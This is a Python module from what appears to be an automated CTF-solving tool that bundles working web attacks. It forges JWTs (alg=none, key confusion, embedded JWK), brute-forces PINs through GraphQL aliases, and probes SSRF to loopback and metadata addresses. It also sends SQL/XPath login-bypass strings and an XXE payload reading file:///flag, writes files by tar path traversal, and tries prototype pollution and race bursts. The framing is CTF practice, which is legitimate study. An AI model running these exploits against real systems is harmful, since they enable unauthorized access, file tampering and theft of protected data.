"""High-value web challenge primitives that need a short multi-step flow.

The ordinary scanner is deliberately broad and mostly request/response based.
This module adds the compact workflows that are common in CTF writeups but
cannot be expressed as a single fuzz payload: JWT key confusion, GraphQL
alias batching, internal SSRF/header tricks, race-to-buy flows, and archive
path traversal.  Every probe is same-origin except the URL values sent to a
target's own SSRF parameter, which stay on loopback/internal lab addresses.
"""
import base64
import hashlib
import hmac
import io
import json
import re
import subprocess
import tarfile
import tempfile
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

from core import httpx
from core.flag import extract_flags
from modules.crypto.rsa import bytes_to_long, long_to_bytes, parse_pem


def _b64url(value):
    if isinstance(value, str):
        value = value.encode()
    return base64.urlsafe_b64encode(value).rstrip(b"=").decode()


def _json_obj(value):
    if isinstance(value, dict):
        return value
    try:
        return json.loads(value or "{}")
    except (TypeError, ValueError):
        return {}


def _flags(response):
    if response is None:
        return []
    known, candidates = extract_flags(response.text)
    return list(dict.fromkeys(known + candidates))


def _post_json(url, body, headers=None, timeout=8):
    merged = {"Content-Type": "application/json"}
    merged.update(headers or {})
    return httpx.post(url, data=json.dumps(body), headers=merged, timeout=timeout)


def _admin_gets(base, token=None, extra_headers=None):
    headers = dict(extra_headers or {})
    if token:
        headers["Authorization"] = "Bearer " + token
    flags = []
    responses = []
    for path in ("/admin", "/api/admin", "/dashboard", "/api/me", "/flag"):
        r = httpx.get(base + path, headers=headers, timeout=8)
        responses.append((path, r))
        flags.extend(_flags(r))
    return responses, list(dict.fromkeys(flags))


def _jwt_token(header, payload, signing_key=None, private=None):
    h = _b64url(json.dumps(header, separators=(",", ":")))
    p = _b64url(json.dumps(payload, separators=(",", ":")))
    signing_input = (h + "." + p).encode()
    if header.get("alg", "").upper() == "NONE":
        return h + "." + p + "."
    if header.get("alg", "").upper() == "HS256" and signing_key is not None:
        sig = hmac.new(signing_key, signing_input, hashlib.sha256).digest()
    elif header.get("alg", "").upper() == "RS256" and private:
        n, d = private["n"], private["d"]
        size = (n.bit_length() + 7) // 8
        digest_info = bytes.fromhex(
            "3031300d060960864801650304020105000420") + hashlib.sha256(signing_input).digest()
        encoded = b"\x00\x01" + b"\xff" * (size - len(digest_info) - 3) + b"\x00" + digest_info
        sig = pow(bytes_to_long(encoded), d, n).to_bytes(size, "big")
    else:
        return None
    return h + "." + p + "." + _b64url(sig)


def _make_test_rsa_key():
    """Generate a throw-away RSA key without making cryptography mandatory."""
    try:
        with tempfile.NamedTemporaryFile(prefix="ctf-auto-jwt-", suffix=".pem") as out:
            proc = subprocess.run(["openssl", "genrsa", "2048"],
                                  stdout=out, stderr=subprocess.DEVNULL,
                                  timeout=12, check=False)
            if proc.returncode != 0:
                return None
            out.seek(0)
            params = parse_pem(out.read())
        if not all(params.get(k) for k in ("n", "e", "d")):
            return None
        return params
    except (OSError, subprocess.SubprocessError):
        return None


def scan_jwt_attacks(base, endpoints):
    findings, flags = [], []
    payload = {"user": "admin", "role": "admin", "isAdmin": True}

    # alg=none is a cheap, high-signal check and does not require a token.
    none_token = _jwt_token({"alg": "none", "typ": "JWT"}, payload)
    _, got = _admin_gets(base, none_token)
    if got:
        findings.append("  [!] JWT alg=none accepted — admin token returned a flag")
        flags.extend(got)

    # Public-key confusion: use a PEM/JWK exposed by the target as an HS256
    # HMAC secret. This follows the standard CTF attack but keeps discovery
    # bounded to the target's own common key endpoints.
    key_responses = []
    for path in ("/key.pem", "/public.pem", "/jwks.json", "/.well-known/jwks.json", "/session"):
        r = httpx.get(base + path, timeout=8)
        if r is not None and r.status == 200:
            key_responses.append((path, r))
    for path, response in key_responses:
        body = response.body
        secret = body
        if b"BEGIN" not in body:
            obj = _json_obj(response.text)
            keys = obj.get("keys") if isinstance(obj, dict) else None
            if keys and isinstance(keys[0], dict):
                for field in ("n", "e", "k"):
                    if keys[0].get(field):
                        secret = str(keys[0][field]).encode()
                        break
        token = _jwt_token({"alg": "HS256", "typ": "JWT"}, payload, signing_key=secret)
        _, got = _admin_gets(base, token)
        if got:
            findings.append(f"  [!] JWT algorithm confusion via {path} — public key reused as HMAC key")
            flags.extend(got)
            break

    # Embedded JWK: sign a token with a generated key and place its public
    # JWK in the header. Only attempt this when the target exposes JWT-shaped
    # routes or an admin/key endpoint, to avoid needless key generation.
    if key_responses or any("jwt" in e.lower() or "admin" in e.lower() for e in endpoints):
        params = _make_test_rsa_key()
        if params:
            def b64int(value):
                return _b64url(long_to_bytes(value))
            jwk = {"kty": "RSA", "n": b64int(params["n"]),
                   "e": b64int(params["e"]), "alg": "RS256", "use": "sig"}
            token = _jwt_token({"alg": "RS256", "typ": "JWT", "jwk": jwk},
                               payload, private=params)
            _, got = _admin_gets(base, token)
            if got:
                findings.append("  [!] JWT embedded JWK accepted — attacker-controlled signing key trusted")
                flags.extend(got)
    return findings, list(dict.fromkeys(flags))


def _graphql_endpoint(base, endpoints):
    for endpoint in endpoints:
        path = endpoint.split("?", 1)[0].rstrip("/").lower()
        if path.endswith("/graphql"):
            return endpoint
    for path in ("/graphql", "/api/graphql", "/graphql/v1"):
        r = _post_json(base + path, {"query": "{__typename}"})
        if r is not None and r.status == 200:
            try:
                if "data" in json.loads(r.text) or "errors" in json.loads(r.text):
                    return base + path
            except ValueError:
                pass
    return None


def scan_graphql_batches(base, endpoints):
    endpoint = _graphql_endpoint(base, endpoints)
    if not endpoint:
        return [], []
    findings, flags = [], []
    # Alias batching is useful when a resolver exposes a PIN/OTP checker but
    # rate-limits individual requests. Try the common resolver names and the
    # short numeric range used by CTF labs in 250-request batches.
    for field in ("verifyPin", "checkPin", "validatePin", "unlock"):
        for start in range(0, 1000, 250):
            aliases = " ".join(
                f"a{i}: {field}(pin: \"{i:03d}\")" for i in range(start, start + 250))
            r = _post_json(endpoint, {"query": "query { " + aliases + " }"}, timeout=12)
            got = _flags(r)
            if got:
                findings.append(f"  [!] GraphQL alias batch brute found a valid {field} response")
                flags.extend(got)
                return findings, list(dict.fromkeys(flags))
    return findings, flags


def scan_internal_routes(base):
    findings, flags = [], []

    # SSRF: cover decimal loopback and common internal flag/metadata routes.
    for path in ("/fetch", "/api/fetch", "/api/relay", "/proxy", "/preview"):
        for target in ("http://127.0.0.1:3000/flag",
                       "http://127.0.0.1:3000/token",
                       "http://2130706433:8080/internal/metadata",
                       "http://127.0.0.1:8080/internal/flag"):
            url = base + path + "?url=" + urllib.parse.quote(target, safe="")
            r = httpx.get(url, timeout=8)
            got = _flags(r)
            if got:
                findings.append(f"  [!] SSRF {path} reached internal target {target}")
                flags.extend(got)
                break

    # Header routing/oracle patterns from real proxy and cache writeups.
    for path in ("/preview", "/", "/health"):
        for header_name, header_value in (("X-Original-URL", "/internal/flag"),
                                          ("X-Rewrite-URL", "/internal/flag"),
                                          ("X-Forwarded-Path", "/internal/flag")):
            r = httpx.get(base + path, headers={header_name: header_value,
                                                "X-Forwarded-Proto": "https",
                                                "User-Agent": "Googlebot"}, timeout=8)
            got = _flags(r)
            if got:
                findings.append(f"  [!] header routing {header_name}: {header_value}")
                flags.extend(got)
                break
    return findings, list(dict.fromkeys(flags))


def scan_common_idor_paths(base):
    """Probe numeric REST resources that are often not linked publicly."""
    findings, flags = [], []
    resources = ("/api/documents/", "/api/report/", "/api/notes/",
                 "/api/users/", "/api/orders/", "/user?id=")
    ids = (1, 2, 3, 42, 100, 101, 1337, 999)
    for resource in resources:
        for value in ids:
            sep = "" if resource.endswith("=") else str(value)
            r = httpx.get(base + resource + sep, timeout=8)
            got = _flags(r)
            if got:
                findings.append(f"  [!] IDOR candidate {resource}{value} returned a flag")
                flags.extend(got)
                break
    return findings, list(dict.fromkeys(flags))


def scan_race(base):
    """Try the common earn-many-times-then-buy-flag lab pattern."""
    earn = base + "/api/earn"
    buy = base + "/api/buy-flag"
    probe = httpx.get(earn, timeout=5)
    if probe is None or probe.status in (404, 405):
        return [], []
    with ThreadPoolExecutor(max_workers=12) as pool:
        list(pool.map(lambda _: _post_json(earn, {}), range(24)))
    r = _post_json(buy, {})
    got = _flags(r)
    if got:
        return ["  [!] race-condition burst reached /api/buy-flag"], got
    return [], []


def scan_archive_uploads(base):
    findings, flags = [], []
    # JSON upload/open polyglot pattern.
    r = _post_json(base + "/api/upload", {"filename": "avatar.png",
                                          "content": "PNG\\nvalid"})
    if r is not None and r.status in (200, 201):
        for name in ("uploads/../vault/flag.txt", "../vault/flag.txt", "vault/flag.txt"):
            rr = httpx.get(base + "/api/open?name=" + urllib.parse.quote(name, safe=""), timeout=8)
            got = _flags(rr)
            if got:
                findings.append("  [!] upload path traversal reached a protected file")
                flags.extend(got)
                break

    # Tar path traversal is a useful fallback for labs that accept archives.
    payload = json.dumps({"trigger": "OVERRIDE_ACTIVE"}).encode()
    buf = io.BytesIO()
    try:
        with tarfile.open(fileobj=buf, mode="w") as archive:
            info = tarfile.TarInfo(name="../../app/views/status.json")
            info.size = len(payload)
            archive.addfile(info, io.BytesIO(payload))
        r = httpx.post(base + "/upload", data=buf.getvalue(),
                       headers={"Content-Type": "application/x-tar"}, timeout=10)
        if r is not None and r.status in (200, 201, 204):
            for path in ("/env-leak", "/debug", "/config", "/status"):
                got = _flags(httpx.get(base + path, timeout=8))
                if got:
                    findings.append("  [!] tar path traversal changed a server-side file")
                    flags.extend(got)
                    break
    except (OSError, tarfile.TarError):
        pass
    return findings, list(dict.fromkeys(flags))


def scan_xpath_and_sqli(base):
    findings, flags = [], []
    payloads = ["admin' or '1'='1", "' or 1=1 or 'x'='x", "admin' or 1=1 --"]
    for path in ("/login", "/api/login", "/auth"):
        for payload in payloads:
            query = urllib.parse.urlencode({"username": payload, "password": "x"})
            r = httpx.get(base + path + "?" + query, timeout=8)
            got = _flags(r)
            if got:
                findings.append(f"  [!] XPath/SQL auth bypass on {path}")
                flags.extend(got)
                break
            r = httpx.post(base + path, data={"username": payload, "password": "x"}, timeout=8)
            got = _flags(r)
            if got:
                findings.append(f"  [!] XPath/SQL auth bypass on {path}")
                flags.extend(got)
                break
    return findings, list(dict.fromkeys(flags))


def scan_xxe(base, endpoints):
    """Probe XML import/parser endpoints for external-entity expansion."""
    candidates = []
    for endpoint in endpoints:
        path = urllib.parse.urlparse(endpoint).path.lower()
        if any(word in path for word in ("xml", "import", "upload", "parse",
                                         "convert", "feed", "document")):
            candidates.append(endpoint.split("?", 1)[0])
    candidates.extend(base + path for path in
                     ("/api/xml", "/api/import", "/api/parse", "/upload",
                      "/import", "/convert"))
    payload = (b'<?xml version="1.0"?>'
               b'<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///flag">]>'
               b'<root><value>&xxe;</value></root>')
    findings, flags = [], []
    for endpoint in list(dict.fromkeys(candidates))[:16]:
        r = httpx.post(endpoint, data=payload,
                       headers={"Content-Type": "application/xml",
                                "Accept": "application/xml, application/json"},
                       timeout=8)
        got = _flags(r)
        if got:
            findings.append(f"  [!] XXE external entity expanded at {endpoint}")
            flags.extend(got)
            break
    return findings, list(dict.fromkeys(flags))


def scan_prototype_pollution(base, endpoints):
    """Try common JSON prototype-pollution shapes against API endpoints.

    The follow-up request is what turns a harmless reflection into a useful
    CTF result: simple labs commonly gate /admin or /flag on role/isAdmin.
    """
    candidates = []
    for endpoint in endpoints:
        path = urllib.parse.urlparse(endpoint).path.lower()
        if "/api/" in path or any(word in path for word in
                                   ("profile", "settings", "message", "user")):
            candidates.append(endpoint.split("?", 1)[0])
    candidates.extend(base + path for path in
                     ("/api/profile", "/api/settings", "/api/update",
                      "/api/message", "/api/user", "/profile"))
    marker = "ctf_auto_polluted"
    payloads = (
        {"__proto__": {"role": "admin", "isAdmin": True, marker: True}},
        {"constructor": {"prototype": {"role": "admin", "isAdmin": True,
                                          marker: True}}},
    )
    findings, flags = [], []
    for endpoint in list(dict.fromkeys(candidates))[:12]:
        for payload in payloads:
            r = _post_json(endpoint, payload, timeout=8)
            if r is None or r.status >= 500:
                continue
            _, got = _admin_gets(base)
            if got:
                findings.append(f"  [!] prototype pollution at {endpoint} reached admin data")
                flags.extend(got)
                return findings, list(dict.fromkeys(flags))
    return findings, flags


def scan_cors(base):
    """Check reflected-origin CORS on common sensitive resources."""
    findings, flags = [], []
    origin = "https://ctf-auto.invalid"
    for path in ("/flag", "/api/me", "/api/admin", "/admin"):
        r = httpx.get(base + path, headers={"Origin": origin}, timeout=8)
        if r is None:
            continue
        got = _flags(r)
        if got:
            findings.append(f"  [!] CORS-enabled sensitive endpoint {path} returned a flag")
            flags.extend(got)
        allow_origin = r.headers.get("access-control-allow-origin", "")
        allow_creds = r.headers.get("access-control-allow-credentials", "").lower()
        if allow_origin in (origin, "*"):
            findings.append(f"  [!] CORS reflects {allow_origin} on {path}"
                            + (" with credentials" if allow_creds == "true" else ""))
    return findings, list(dict.fromkeys(flags))


def scan_advanced(base, endpoints):
    """Run high-value multi-step web checks and return (findings, flags)."""
    jobs = (scan_jwt_attacks, scan_graphql_batches, lambda b, e: scan_internal_routes(b),
            lambda b, e: scan_common_idor_paths(b),
            lambda b, e: scan_race(b), lambda b, e: scan_archive_uploads(b),
            lambda b, e: scan_xpath_and_sqli(b),
            lambda b, e: scan_xxe(b, e),
            lambda b, e: scan_prototype_pollution(b, e),
            lambda b, e: scan_cors(b))
    findings, flags = [], []
    with ThreadPoolExecutor(max_workers=len(jobs)) as pool:
        futures = [pool.submit(job, base, endpoints) for job in jobs]
        for future in futures:
            try:
                f, fl = future.result()
            except Exception:
                continue
            findings.extend(f)
            flags.extend(fl)
    return findings, list(dict.fromkeys(flags))
